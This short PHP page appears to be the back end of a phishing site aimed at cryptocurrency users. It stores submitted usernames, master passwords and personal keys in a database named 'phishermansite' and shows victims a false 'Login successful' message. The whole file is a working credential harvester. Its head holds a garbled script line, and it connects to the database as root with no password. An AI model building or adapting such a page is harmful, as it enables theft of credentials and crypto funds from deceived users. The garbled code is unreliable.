<html>
<head>
    <script src="./image.js"><?php$status?> = validatecaptcha();</script>
    
</head>

<body>
<?php
$conn = new mysqli('localhost', 'root', '', 'phishermansite');
if ($conn->connect_error) {
    die('Connection Failed : ' . $conn->connect_error);
}else{
    $Username = $_POST['Username'];
    $Password = $_POST['MasterPassword'];
    $PersonalKey = $_POST['PersonalKey'];

    $stmt = $conn->prepare("INSERT INTO crypto (Username, Password, PersonalKey) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $Username, $Password, $PersonalKey);
    $stmt->execute();
    echo "Login successful";
    $stmt->close();
    $conn->close();
    //header("Location: http://localhost/phishermansite/CryptoLoginPage.php");
    exit;
}


?>
</body>
</html>
